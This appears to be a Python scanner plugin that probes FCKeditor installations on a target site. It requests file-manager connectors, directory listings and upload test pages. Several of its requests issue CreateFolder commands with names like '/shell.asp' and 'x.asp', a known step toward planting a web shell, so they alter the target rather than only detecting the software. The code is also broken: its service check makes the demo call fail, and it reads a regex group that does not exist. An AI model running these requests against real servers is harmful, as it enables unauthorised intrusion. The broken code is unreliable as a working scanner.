#!/usr/bin/env python
import re
import urlparse


def assign(service, arg):
    if service != "www":
        return
    return True, arg


def audit(arg):
    url = arg
    urls = ["/fckeditor/editor/dialog/fck_about.html",
            "/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php",
            "/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.asp",
            "/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.jsp",
            "/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.aspx",

            "/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx",
            "/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp",
            "/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/jsp/connector.jsp",
            "/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/php/connector.php",

            "/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector",
            "/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector",
            "/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/asp/connector",
            "/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/aspx/connector",

            "/fckeditor/connectors/asp/connector.asp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp",
            "/fckeditor/connectors/jsp/connector.jsp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/jsp/connector.jsp",
            "/fckeditor/connectors/php/connector.php/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/php/connector.php",
            "/fckeditor/connectors/aspx/connector.aspx/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/aspx/connector.aspx",

            "/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F",

            "/fckeditor/editor/filemanager/connectors/asp/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=/qing.asp&NewFolderName=x.asp",
            "/fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684",

            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=",
            "/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=",
            "/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=",
            "/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=",

            "/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/php/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F",

            "/fckeditor/editor/filemanager/browser/default/connectors/test.html",
            "/fckeditor/editor/filemanager/upload/test.html",
            "/fckeditor/editor/filemanager/connectors/test.html",
            "/fckeditor/editor/filemanager/connectors/uploadtest.html"]

    for x in urls:
        code, head, res, errcode, _ = curl.curl(url + x)
        if code == 200:
            m = re.search(r'edit', res)
            if m:
                security_info(m.group(1))


if __name__ == '__main__':
    from dummy import *

    audit(assign('gnuboard', 'http://www.example.com/')[1])
